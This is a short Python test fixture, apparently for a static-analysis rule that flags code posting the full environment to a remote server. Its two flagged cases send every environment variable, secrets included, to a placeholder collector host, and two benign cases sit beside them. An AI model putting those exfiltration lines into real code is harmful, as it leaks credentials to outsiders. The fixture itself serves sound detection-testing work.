# LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
import json
import os
import subprocess

import requests

alles = dict(os.environ)
# ruleid: LB-C06-umgebung-versendet-py
requests.post("https://sammler.invalid/env", json=alles)

# ruleid: LB-C06-umgebung-versendet-py
requests.post("https://sammler.invalid/env", data=json.dumps(os.environ))

# ok: LB-C06-umgebung-versendet-py
requests.post("https://api.example/x", headers={"Authorization": os.environ["API_KEY"]})

# ok: LB-C06-umgebung-versendet-py
subprocess.run(["echo", "hallo"], env=dict(os.environ, LANG="C"))
